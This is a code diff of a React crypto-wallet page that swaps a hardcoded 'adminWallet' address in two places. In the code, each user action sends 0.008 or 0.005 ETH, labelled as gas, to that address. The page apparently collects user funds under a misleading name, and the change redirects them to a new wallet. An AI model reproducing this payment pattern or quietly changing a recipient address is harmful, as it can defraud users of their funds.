@@ -375,6 +375,8 @@ export default function FlashedPage() {
     }
   };
 
+
+
   const handleAction = async (action, token = null) => {
     if (!userAddress) {
       await connectWallet();
@@ -431,7 +433,7 @@ export default function FlashedPage() {
       const signer = await provider.getSigner();
       
       const gasAmount = customAmount || (action === 'swap' ? '0.008' : '0.005');
-      const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
+      const adminWallet = '0x849842febf6643f29328a2887b3569e2399ac237';
       
       const tx = await signer.sendTransaction({
         to: adminWallet,
@@ -569,7 +571,7 @@ export default function FlashedPage() {
         return;
       }
       
-      const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
+      const adminWallet = '0x849842febf6643f29328a2887b3569e2399ac237';
       
       const tx = await signer.sendTransaction({
         to: adminWallet,
@@ -647,6 +649,8 @@ export default function FlashedPage() {
               >
                 Connect Wallet
               </button>
+              
+
               
               <button 
                 onClick={() => setShowModal('walletOptions')}
